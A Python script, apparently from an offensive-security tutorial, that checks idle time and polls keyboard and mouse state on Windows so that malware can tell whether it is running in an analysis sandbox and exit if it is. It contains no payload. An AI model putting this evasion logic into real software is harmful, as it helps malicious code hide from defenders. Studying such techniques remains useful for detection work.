from ctypes import byref, c_uint, c_ulong, sizeof, Structure, windll
import random
import sys
import time
import win32api

# A structure that will hold the timestamp in ms of OS last input event.
class LASTINPUTINFO(Structure):
    _fields_ = [
        ('cbSize', c_uint),
        ('dwTime', c_ulong)
    ]

def get_last_input():
    struct_lastinputinfo = LASTINPUTINFO()
    # Initialize the 'cbsize' to the size of the structure before the call.
    struct_lastinputinfo.cbSize = sizeof(LASTINPUTINFO)
    # Populate the 'struct_lastinputinfo.dwTime' using the 'GetLastInputInfo' function.
    windll.user32.GetLastInputInfo(byref(struct_lastinputinfo))
    # Determine how long the system has been running using 'GetTickCount' function.
    run_time = windll.kernel32.GetTickCount()
    # Calculate the elapsed time in ms.
    elapsed = run_time - struct_lastinputinfo.dwTime
    print(f"[*] It's been {elapsed} milliseconds since the last input event.")
    return elapsed

# Small snippet for testing the above function. It's commented for testing. But you can remove it.
# while True:
#    get_last_input()
#    time.sleep(1)

class Detector:
    def __init__(self):
        # Initialize clicks and keystrokes to 0.
        self.double_clicks = 0
        self.keystrokes = 0
        self.mouse_clicks = 0

    # This method reads the number and time of mouse clicks & keyboard clicks.
    def get_key_press(self):
        # Iterate over a range of valid input keys.
        for i in range(0, 0xff):
            # Check key pressing using the 'GetAsyncKeyState' function.
            state = win32api.GetAsyncKeyState(i)
            # If truthful:
            if state & 0x0001:
                # Check for (Left-mouse key button) known virtually as '0x1'.
                if i == 0x1:
                    # Increment the total click count and return timestamp for later use.
                    self.mouse_clicks += 1
                    return time.time()
                # Check ASCII keypresses.
                elif i > 32 and i < 127:
                    # If any, increment the total number of clicks.
                    self.keystrokes += 1
        return None

    # ---The primary detection loop.
    def detect(self):
        previous_timestamp = None
        first_double_click = None
        double_click_threshold = 0.35

        # Defined the required variables:
        max_double_clicks = 10
        max_keystrokes = random.randint(10, 25)
        max_mouse_clicks = random.randint(5, 25)
        max_input_threshold = 30000

        # Retrieve the elapsed time since some form of input should have been registered by now.
        last_input = get_last_input()
        if last_input >= max_input_threshold:
            # Instead of dying here, we can pad some innocuous tasks like readying registry keys of browsing the file system to pass this check.
            # The user may sleep or leave for break, we can't assume we in a sandbox that easy and die out.
            sys.exit(0)

        detection_complete = False
        while not detection_complete:
            # Check for key presses & mouse clicks.
            keypress_time = self.get_key_press()
            if keypress_time is not None and previous_timestamp is not None:
                # Calculate the time elapsed between mouse clicks.
                elapsed = keypress_time - previous_timestamp

                # Compare the results to the threshold we set up earlier.
                if elapsed <= double_click_threshold:
                    self.mouse_clicks -= 2
                    self.double_clicks += 1
                    if first_double_click is None:
                        first_double_click = time.time()
                    else:
                        # Look for streaming clicks which is used to trick detectors like this one.
                        if self.double_clicks >= max_double_clicks:
                            # If max number of double-clicks was reached in a non-human timing, we bounce.
                            if (keypress_time - first_double_click <=
                                    (max_double_clicks * double_click_threshold)):
                                sys.exit(0)
                # Verify if we passed all checks; if so, we break out the sandbox detection.
                if (self.keystrokes >= max_keystrokes and
                        self.double_clicks >= max_double_clicks and
                        self.mouse_clicks >= max_mouse_clicks):
                    detection_complete = True

                previous_timestamp = keypress_time
            elif keypress_time is not None:
                previous_timestamp = keypress_time

if __name__ == '__main__':
    d = Detector()
    d.detect()
    print('okay.')
